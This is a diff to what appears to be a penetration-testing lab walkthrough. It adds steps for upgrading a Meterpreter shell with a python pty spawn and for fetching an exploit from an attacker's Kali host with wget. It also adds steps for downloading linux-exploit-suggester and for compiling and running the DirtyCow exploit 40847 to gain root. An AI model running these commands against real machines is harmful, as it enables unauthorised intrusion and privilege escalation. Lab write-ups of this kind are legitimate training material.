@@ -164,7 +164,7 @@ set LHOST YOUR_KALI_IP
 Run exploit:
 
 ```bash
-run
+run OR exploit
 ```
 
 Meterpreter session obtained successfully.
@@ -177,6 +177,7 @@ Spawn shell:
 
 ```bash
 shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 Check current user:
@@ -209,7 +210,7 @@ Copy exploit locally:
 searchsploit -m linux/local/40839.c
 ```
 
-Start Python server on Kali Linux:
+Start Python server on your Kali Linux:
 
 ```bash
 python3 -m http.server 8000
@@ -218,7 +219,7 @@ python3 -m http.server 8000
 On target machine download exploit:
 
 ```bash
-wget http://YOUR_KALI_IP:8000/40839.c
+wget http://YOUR_KALI_IP/40839.c
 ```
 
 Compile exploit:
@@ -248,6 +249,38 @@ su firefart
 ```
 
 Enter generated password from exploit output.
+                   OR
+
+Type this in the target machine
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh --no-check-certificate (if not working the first alternative)
+
+After it 
+```bash
+chmod +x les.sh
+```
+Then,
+```bash
+./les.sh
+```
+After it there will be more CVE available so in that i choose DirtyDow2 in that there are one link for download if it doesn't work try the second one name ex link where ending 40847 after download
+
+It will save the file in 40847 we should change 40847 into 40847.cpp
+```bash
+mv 40847 40847.cpp
+```
+After you run this 
+```bash
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+```
+Then
+```bash
+ls
+```
+It will display all the files that in the place where you are in the target location next you will find a file name called dcow
+```bash
+./dcow -s
+```
 
 ---
 
